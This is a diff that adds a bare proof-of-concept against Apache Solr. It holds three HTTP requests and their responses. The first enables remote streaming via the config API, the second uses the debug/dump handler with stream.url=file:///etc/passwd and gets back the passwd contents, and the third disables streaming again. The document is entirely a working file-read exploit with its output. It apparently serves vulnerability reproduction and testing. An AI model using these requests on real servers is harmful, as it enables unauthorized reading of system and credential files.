@@ -1,0 +1,62 @@
+- Request 1:
+
+POST /solr/test/config HTTP/1.1
+
+{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+
+- Response 1:
+
+HTTP/1.1 200 Ok
+Content-Length: 0
+
+- Request 2:
+
+GET /solr/test/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd HTTP/1.1
+
+- Response 2:
+
+HTTP/1.1 200 Ok
+Content-Length: 635
+
+{
+  "responseHeader": {
+    "status": 0,
+    "QTime": 6,
+    "handler": "org.apache.solr.handler.DumpRequestHandler",
+    "params": {
+      "param": "ContentStreams",
+      "stream.url": "file:///etc/passwd"
+    }
+  },
+  "params": {
+    "stream.url": "file:///etc/passwd",
+    "echoHandler": "true",
+    "param": "ContentStreams",
+    "echoParams": "explicit"
+  },
+  "streams": [
+    {
+      "name": null,
+      "sourceInfo": "url",
+      "size": null,
+      "contentType": null,
+      "stream": "root:x:0:0:root:/root:/bin/bash"
+    }
+  ],
+  "context": {
+    "webapp": "/solr",
+    "path": "/debug/dump",
+    "httpMethod": "GET"
+  }
+}
+
+- Request 3:
+
+POST /solr/test/config HTTP/1.1
+
+{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":false}}
+
+- Response 3:
+
+HTTP/1.1 200 Ok
+Content-Length: 0
